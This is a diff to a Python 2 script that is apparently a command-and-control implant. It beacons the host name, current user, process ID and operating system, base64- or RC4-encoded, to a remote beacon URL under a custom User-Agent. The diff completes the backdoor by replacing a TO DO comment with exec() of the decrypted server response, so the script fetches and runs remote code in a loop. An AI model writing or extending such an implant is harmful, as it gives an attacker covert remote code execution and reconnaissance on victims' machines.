@@ -50,12 +50,11 @@ def initial_beacon():
             (process_id_var, globals()[process_id_var]),
             (operating_system_var, globals()[operating_system_var])]
 
-        base64_encoded = base64.b64encode(urllib.urlencode(post_data))
-        request = urllib2.Request(beacon_url, base64_encoded)
+        base64_post_data = base64.b64encode(urllib.urlencode(post_data))
+        request = urllib2.Request(beacon_url, base64_post_data)
         request.add_header("User-Agent", user_agent)
         f = urllib2.urlopen(request)
         response = f.read()
-        print response
         return response
     except:
         pass
@@ -72,8 +71,8 @@ def rc4_beacon(key):
         current_user = getpass.getuser()
         process_id = os.getpid()
 
-        params = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
-        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(params)))
+        post_data = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
+        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(post_data)))
         request.add_header("User-Agent", user_agent)
         request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
@@ -91,7 +90,7 @@ if __name__ == "__main__":
         if counter == 0:
             k = base64.b64decode(initial_beacon())
         else:
-            rc4_beacon(k) # TO DO: This the output returned from this will get decrypted and ran through a Python exec() function
+            exec(rc4_beacon(k))
 
         counter += 1
         time.sleep(sleep_interval)
